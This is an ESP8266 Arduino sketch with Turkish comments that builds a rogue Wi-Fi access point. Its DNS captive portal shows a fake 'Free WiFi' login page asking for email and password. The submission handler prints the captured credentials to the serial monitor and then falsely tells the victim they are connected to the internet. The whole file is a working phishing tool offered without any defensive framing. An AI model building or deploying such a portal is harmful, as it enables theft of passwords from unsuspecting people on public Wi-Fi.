#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

// WiFi ağı bilgileri
const char* ssid = "captiveWeb";       // WiFi ssid
const char* password = "Test.1234";    // WiFi şifre

// Web sunucusu için port
const byte DNS_PORT = 53;
IPAddress APIP(172, 0, 0, 1); // Gateway IP
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// Kullanıcı bilgilerini saklamak için
String userEmail = "";
String userPassword = "";

void setup() {
  Serial.begin(115200);

  // WiFi erişim noktasını başlat (şifreli)
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid, password);

  // DNS sunucusunu başlat (Captive Portal için)
  dnsServer.start(DNS_PORT, "*", APIP);

  // Web sunucusu rotalarını tanımla
  webServer.on("/", handleRoot); // Ana sayfa
  webServer.on("/submit", handleSubmit); // Form gönderimi
  webServer.onNotFound(handleRoot); // Tüm istekleri ana sayfaya yönlendir

  // Web sunucusunu başlat
  webServer.begin();
  Serial.println("Web server started");

  // Erişim noktasının IP adresini yazdır
  Serial.print("Access Point IP address: ");
  Serial.println(WiFi.softAPIP());
}

void loop() {
  // DNS isteklerini işle
  dnsServer.processNextRequest();

  // Web sunucusu isteklerini işle
  webServer.handleClient();
}

// Ana sayfa (Captive Portal)
void handleRoot() {
  String html = "<!DOCTYPE html><html><head><title>Free WiFi</title>"
                "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">"
                "<style>"
                "body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }"
                "form { display: inline-block; text-align: left; }"
                "input { margin: 10px 0; padding: 10px; width: 100%; }"
                "button { background-color: #4CAF50; color: white; padding: 10px 20px; border: none; cursor: pointer; }"
                "button:hover { background-color: #45a049; }"
                "</style></head><body>"
                "<h1>Welcome to Free WiFi</h1>"
                "<p>Please log in to access the internet.</p>"
                "<form action=\"/submit\" method=\"post\">"
                "<label for=\"email\">Email:</label><br>"
                "<input type=\"email\" id=\"email\" name=\"email\" placeholder=\"Enter your email\" required><br>"
                "<label for=\"password\">Password:</label><br>"
                "<input type=\"password\" id=\"password\" name=\"password\" placeholder=\"Enter your password\" required><br>"
                "<button type=\"submit\">Log In</button>"
                "</form></body></html>";
  webServer.send(200, "text/html", html);
}

// Form gönderimi işleme
void handleSubmit() {
  // Kullanıcıdan gelen verileri al
  userEmail = webServer.arg("email");
  userPassword = webServer.arg("password");

  // Serial Monitor'de yazdır
  Serial.println("New submission:");
  Serial.println("Email: " + userEmail);
  Serial.println("Password: " + userPassword);

  // Kullanıcıya teşekkür mesajı göster
  String html = "<!DOCTYPE html><html><head><title>Thank You</title>"
                "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">"
                "<style>"
                "body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }"
                "</style></head><body>"
                "<h1>Thank You!</h1>"
                "<p>You are now connected to the internet.</p>"
                "</body></html>";
  webServer.send(200, "text/html", html);
}